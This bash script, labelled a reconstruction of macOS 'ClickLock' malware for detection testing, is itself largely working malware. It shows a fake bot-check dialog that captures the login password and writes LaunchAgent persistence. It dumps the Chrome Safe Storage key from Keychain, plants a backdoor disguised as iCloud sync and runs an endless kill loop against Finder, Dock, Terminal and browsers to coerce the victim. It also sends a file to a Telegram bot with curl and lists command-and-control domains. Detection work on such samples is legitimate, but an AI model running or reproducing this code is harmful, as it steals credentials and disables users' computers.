#!/bin/bash
# Reconstructed from public Group-IB ClickLock artifacts (2026-07-16) for detection testing only.
# Not the original sample; strings/paths mirror the documented orchestrator + modules.
mkdir -p "$HOME/.cacheb"
BANNER="CLOUDFLARE CAPTCHA ACCESS CONTROL"
osascript -e 'display dialog "Verifying you are not a bot" with title "Collecting browser signals" default answer "" with hidden answer'
# harvest login password behind fake Apple dialog, then persist
cat > "$HOME/Library/LaunchAgents/com.authirity.plist" <<'PL'
<?xml version="1.0"?><plist><dict><key>Label</key><string>com.authirity</string></dict></plist>
PL
cat > "$HOME/Library/LaunchAgents/com.chromer.plist" <<'PL'
<?xml version="1.0"?><plist><dict><key>Label</key><string>com.chromer</string></dict></plist>
PL
# Keychain: Chrome Safe Storage AES key
security find-generic-password -wa "Chrome" > "$HOME/.cacheb/$USER-chrome-key.txt"
# GSocket backdoor disguised as iCloudsync
cp ./goyim "$HOME/Library/Application Support/iCloudsync"
# coercion kill-loop until the victim types the password
while true; do
  killall Finder Dock Terminal "Activity Monitor" Console "System Settings" Spotlight NotificationCenter SystemUIServer 2>/dev/null
  killall "Google Chrome" Safari firefox 2>/dev/null
  /bin/sleep 0.210
done
# exfil
curl -s "https://api.telegram.org/bot%TOKEN%/sendDocument" -F document=@finder_output.txt
# C2: panalobet.ph store.grafsynergy.com cottonbox.co.il gsnc.eu:67
